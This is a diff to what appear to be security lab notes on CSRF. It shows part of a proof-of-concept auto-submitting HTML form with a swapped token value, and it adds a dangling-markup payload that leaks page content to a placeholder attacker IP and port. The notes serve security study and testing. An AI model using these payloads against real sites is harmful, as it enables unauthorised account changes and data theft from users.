@@ -32,7 +32,7 @@ While logged into the target user account, open a new tab and visit the URL host
       <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
       <input type="hidden" name="country" value="CSRF_POC" />
       <input type="hidden" name="action" value="save" />
-      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
+      <input type="hidden" name="csrf" value="5d3d079457440b13e88ad917fcab3b2ff6f1ec9d" />
       <input type="submit" value="Submit request" />
     </form>
     <script>
@@ -42,4 +42,9 @@ While logged into the target user account, open a new tab and visit the URL host
 </html>
 ```
 
+# POST-based
+
+```html
+<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
+```
 
